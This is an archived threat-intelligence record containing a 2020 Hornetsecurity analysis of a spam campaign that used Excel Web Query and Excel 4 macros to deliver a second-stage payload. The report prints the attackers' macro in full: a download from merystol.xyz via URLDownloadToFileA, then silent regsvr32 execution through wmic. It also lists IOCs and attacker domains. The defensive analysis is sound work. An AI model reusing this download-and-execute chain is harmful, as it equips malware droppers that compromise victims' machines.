{
    "id": "c3c68ed3-c8fc-4dba-925c-df14a7e9aac9",
    "created_at": "2023-01-12T15:00:19.433187Z",
    "updated_at": "2025-03-27T02:05:19.401161Z",
    "deleted_at": null,
    "sha1_hash": "e97d63ee2ea3f1e31f5713831cdec1a039c474d5",
    "title": "2020-02-28 - Mysterious spam campaign- A security analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T04:46:42Z",
    "file_modification_date": "2022-05-28T04:46:42Z",
    "file_size": 1893180,
    "plain_text": "# Mysterious spam campaign: A security analysis\n\n**hornetsecurity.com/en/security-information/mysterious-spam-campaign/**\n\nHannah Kreyenberg February 28, 2020\n\nWhile abuse of Excel Web Query (IQY) is nothing new in malware [1], a recent case had not just the Hornetsecurity\nSecurity Lab researchers but also other researchers [3][6] puzzled.\n\nA email spam campaign delivering malicious Excel documents in zipped archives which eventually only start the Windows\nCalculator application on the analysts computers, potentially, in an attempt to deflect from their real payload delivered to\nvictims. The Security Lab unravels the case in this report.\n\n## The Procedure\n\nThe malicious documents are distributed as zip archived attachments named invoice*.xls.zip with the * part being the only\nvariable part.\n\nThe accompanying email message is very short, sometimes without greeting, sometimes with, but always referring the\n**victim to the attachment without further text:**\n\n\n-----\n\nOnce unzipped and opened the document generates a pop up with the fake dialog message, stating “We found a problem\nwith some content. Do you want to try to recover as much as we can?”:\n\nThen the document uses Excel Web Query to download further macro code from a remote location.\n\nOne such observed macro code downloaded and started an executable (identified as w32-dll-run-shellcode.dll), which in\nturn executes the Windows Calculator application calc.exe.\n\nThe Hornetsecurity Security Lab believes this was/is not the intended payload. However, from OSINT research and\ncorrelating other sources the only confirmed delivered payload was said w32-dll-run-shellcode.dll. It is not known whether\nat any other points in time a malicious payload instead of the w32-dll-run-shellcode.dll was delivered. Nor is known\nwhether w32-dll-run-shellcode.dll **is/was served intentionally or in error.**\n\n## Technical Analysis\n\n### Document\n\nThe document has a hidden sheet:\n\n\n-----\n\nOn this hidden sheet in the cells the macro code for the previous outlined decoy pop up can be seen:\n\nWhen executing the document without Internet an error is received stating the malicious URL that was attempted to be\nloaded:\n\n\n-----\n\nWhen executing the document with emulated Internet and passing the request a generic reply a Web query error is\nreceived:\n\nKnowing this fact, the Data Connections of the Workbook can be examined to reveal the Web Query connection string:\n\n\n-----\n\nUnfortunately, the Excel Web Query (IQY) file could not be loaded and HTTP connections were redirected via a 301 code\nto https://www.google.com/. This is a known technique to block researchers **from accessing the payload. This could**\nhappen based on IP address ranges or so called geofencing, so only intended victim networks have access to the\npayload, or the URL could only allow a specific number of payload downloads before redirection.\n\nFrom other sources it is known that one Excel Web Query request returned:\n\nWhile the =CLOSE(FALSE) commands instruct Excel to close the Workbook, we further investigated the base URL\n_/lander/excel4_158158672/index.html. However, it also redirected to https://www.google.com/._\n\nEventually, /lander/excel4 returns the following Excel 4 macro:\n\n_=CALL(“urlmon”,”URLDownloadToFileA”,”JJCCJJ”,0,”https://merystol.xyz/SDVsdv23r”,”c:\\\\Users\\\\Public\\\\fbafb4234.html”,0,0)_\n\n_=IF(ALERT(“The workbook cannot be opened or repaired by Microsoft Excel because it is corrupt.”,2),_\n_WAIT(NOW()+”00:00:01″), )_\n\n_=EXEC(“wmic process call create “”regsvr32 -s c:\\\\Users\\\\Public\\\\fbafb4234.html”””)_\n\n_=CLOSE(FALSE)_\n\nThis macro downloads a file from https://merystol.xyz/SDVsdv23r to c:\\\\Users\\\\Public\\\\fbafb4234.html via\n_urlmon.URLDownloadToFileA. Then launches regsvr32 via wmic process call create to silently (-s switch) register the_\ndownloaded DLL.\n\n\n-----\n\nAnd here the case gets curious: While the above URL on https://merystol.xyz/SDVsdv23r redirected to\n_https://www.google.com/ during our analysis, from VirusTotal it can be seen that the URL at one point in the past served a_\nfile with the hash 85697bfc0e89c5499a46aeec656b3b9facd8b9fe7174b3db9b2b9f7dbcbaaedb [2].\n\nThe w32-dll-run-shellcode.dll is very bare containing no imports and barely any strings:\n\n_$ strings 85697bfc0e89c5499a46aeec656b3b9facd8b9fe7174b3db9b2b9f7dbcbaaedb.bin_\n\n_!This program cannot be run in DOS mode._\n\n_Rich_\n\n_.text_\n\n_`.rdata_\n\n_@.reloc_\n\n_RhcalcTYRQd_\n\n_WinEu_\n\n_w32-dll-run-shellcode.dll_\n\n__DllMain@12_\n\nGithubtribution via the w32-dll-run-shellcode.dll string leads to https://github.com/CryptXor/win-exec-calc_shellcode/blob/master/build_config.py (a clone from the original project at https://code.google.com/archive/p/win-exec-_\n_calc-shellcode/). The code in questions is identical to https://github.com/CryptXor/win-exec-calc-_\n_shellcode/blob/master/w32-exec-calc-shellcode.asm. This is old PoC code by an offensive security researcher that_\nexecutes calc.exe.\n\nThe download of this w32-dll-run-shellcode.dll has also been observed by other researchers [3].\n\nThe same w32-dll-run-shellcode.dll was also available at https://brinchik.xyz/Qz8ZNnxg [4]. A domain and URL naming\nscheme that fits with the malware observed in here. That same URL had re-directions to a URL downloading Ursnif.\nThis was previously analyzed by another researcher [5]. Meaning that it is likely that the execution of calc.exe is a\n**calculated move by the attackers to deflect analysis of the real payload. Whether this campaign is related to Ursnif**\nand what actor, however, can not be determined at this point.\n\n## Delivery\n\nThe emails are send from real aol.com (89 %) and wp.pl (11 %) email accounts. Hence the aol.com emails also pass\nDMARC validation. We could not observe reuse of email addresses, meaning the delivery was definitively coordinated\nensuring that a clean sender email was used for each delivery. However, the would be recipients indicate no targeting for\n\n\n-----\n\na specific sector or industrial vertical.\n\nEmails have been delivered on 2020-02-14, 2020-02-19, 2020-02-20 and 2020-02-21:\n\nThe sender names follow the pattern firstname.lastname[0-9a-z]{0,5}@(aol.com|wp.pl).\n\nThe low volume of emails could also indicate that this was a first test or demonstration of a new malicious document type\nleveraging Excel Web Queries.\n\n## Conclusion and Remediation\n\nThis campaign uses Excel 4 macros and Excel Web Queries for execution and delivery of a – yet unknown – 2nd stage\nmalware. This likely allows the circumvention of some detentions looking only for VBA macros. What payload exactly is\ndelivered and whether the delivery of a 2nd stage that simply opens the Calculator application is by design as an analysis\nevasion technique or by error is yet unknown. What is clear that the time spend in the delivery phase and the redirections\nto Google on the payload URL indicate that this is likely a calculated deflection.\n\nUsers can protect themselves from this type of malicious documents by:\n\ndisabling macros and remote content in Office.\nnot enabling any editing or macro features even if instructed to do so by a document.\n\nHornetsecurity already blocks this style of malicious campaigns and the Security Lab is further monitoring the situation.\n\n## Indicators of Compromise (IOCs)\n\nHashes\n\nSHA256 Description\n\n018902c1bbfe41581710c5efad2a2c9f516bd7aa98dc8432584520623e7eb2bc Document\n\n6dcc25eb214c38bc942ffdbe8680a1dec867ac4780aac7262391298d561b5928 Document\n\n822054123910494bbb80cc4e46f79f045cc527dc12d89bda4b8b58bd9be417f7 Document\n\ndc778302fefac2735c112311736e2050eef7a2b84b1e1569b0456e8349d0715c Document\n\ne1bf01178976efeedcd277f83bebc02f8f4d687d7348d906950a0a524f3f1a98 Document\n\nDNSs\n\ndoolised.xyz\nemmnebuc.xyz\nmerystol.xyz\nveqejzkb.xyz\n\nMITRE ATT&CK techniques\n\nTactic ID Name Description\n\nInitial Access T1193 Spearphishing Attachment Sends email to obtain initial access.\n\nExecution T1204 User Execution Victim executes the payload.\n\n\n-----\n\nExecution T1047 Windows Management\nInstrumentation\n\n\nWMI was used to execute loading of 2nd stage\npayload.\n\n\nDefense\nEvasion\n\n## References\n\n\nT1117 Regsvr32 Proxy execution of 2nd stage payload.\n\n\n\n[1] [https://www.vmray.com/cyber-security-blog/forgotten-ms-office-features-used-deliver-malware/#iqy](https://www.vmray.com/cyber-security-blog/forgotten-ms-office-features-used-deliver-malware/#iqy)\n\n[2]\nhttps://www.virustotal.com/gui/url/0ea161943aabfc3d817f74159aaf784bf70a9e0e88c611da47c761ab76f996eb/detai\nls\n\n[3] [https://blog.comae.io/active-email-campaign-identified-with-malicious-excel-files-174bbde91fc1](https://blog.comae.io/active-email-campaign-identified-with-malicious-excel-files-174bbde91fc1)\n\n[4]\nhttps://www.virustotal.com/gui/url/f5e284d288df042299dafe78b02d6264a48049ca2fc4af57e2812fb107760212/detail\ns\n\n[5] [https://twitter.com/malware_traffic/status/1207779656998498304](https://twitter.com/malware_traffic/status/1207779656998498304)\n\n[6] [https://twitter.com/msuiche/status/1231170309266558976](https://twitter.com/msuiche/status/1231170309266558976)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-28 - Mysterious spam campaign- A security analysis.pdf"
    ],
    "report_names": [
        "2020-02-28 - Mysterious spam campaign- A security analysis.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535619,
    "ts_updated_at": 1743041119,
    "ts_creation_date": 1653713202,
    "ts_modification_date": 1653713202,
    "files": {
        "pdf": "https://archive.orkl.eu/e97d63ee2ea3f1e31f5713831cdec1a039c474d5.pdf",
        "text": "https://archive.orkl.eu/e97d63ee2ea3f1e31f5713831cdec1a039c474d5.txt",
        "img": "https://archive.orkl.eu/e97d63ee2ea3f1e31f5713831cdec1a039c474d5.jpg"
    }
}